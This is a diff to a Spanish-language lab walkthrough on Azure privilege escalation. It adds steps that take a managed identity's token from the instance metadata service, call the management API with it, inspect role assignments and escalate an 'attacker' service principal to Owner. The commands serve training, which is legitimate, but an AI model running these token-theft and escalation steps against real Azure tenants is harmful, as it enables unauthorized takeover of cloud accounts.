@@ -106,15 +106,32 @@ Este script completo se ejecuta dentro de la VM para obtener el token y listar r
   1. Obtener el token de acceso de la identidad, usando jq para extraerlo
      
         token=$(curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H Metadata:true | jq -r .access_token)
+
+ 
+  
         
  2. Usar el token para realizar una llamada a la API de Azure y listar recursos
-         
-       curl -s -X GET -H "Authorization: Bearer $token" "https://management.azure.com/subscriptions/$(az account show --query id -o tsv)/resourceGroups/lab-escalation/resources?api-version=2021-04-01"
 
-Resultado Esperado: Una salida JSON con la lista de todos los recursos del grupo lab-escalation. Esto prueba que el atacante ahora opera con los permisos de la identidad (User Access Administrator).
+  Obtener nombre del grupo de recursos:
+
+  az group list --output table  
+
+ curl -s -X GET -H "Authorization: Bearer $token" "https://management.azure.com/subscriptions/$(az account show --query id -o tsv)/resourceGroups/lab-escalation/resources?api-version=2021-04-01"
+
+  Copia el nombre de la identidad administrada y el nombre del grupo de recursos para ejecutar el siguiente script
+
+  PRINCIPAL_ID=$(az identity show --name "labidentity" --resource-group "lab-escalation" --query 'principalId' -o tsv)
+
+  echo "Principal ID: $PRINCIPAL_ID"
+
+  Despues comprueba con el ID  de la identidad administrada que rol tiene asignado ejecutando lo siguiente:
+  
+  az role assignment list --assignee "$PRINCIPAL_ID" --query "[].{Role:roleDefinitionName, Scope:scope}" -o table    
+  
 
 ### Paso 2.1: Escalada Final a Propietario (Owner)
 Utilizar el poder adquirido para tomar control total.
+
 A. (En la máquina local) Obtener el Object ID del Service Principal atacante
 
 user_object_id=$(az ad sp list --display-name "attacker-sp" --query "[0].id" -o tsv)
@@ -149,6 +166,8 @@ az login --service-principal \
     --tenant "EL_TENANT_ID_PROPORCIONADO"
 
 (En la máquina local) El atacante, ahora Owner, Consulta los grupos de recursos existentes.
+
+Consultemos nuevamente que grupos de recursos existen 
 
 az group list --output table
 
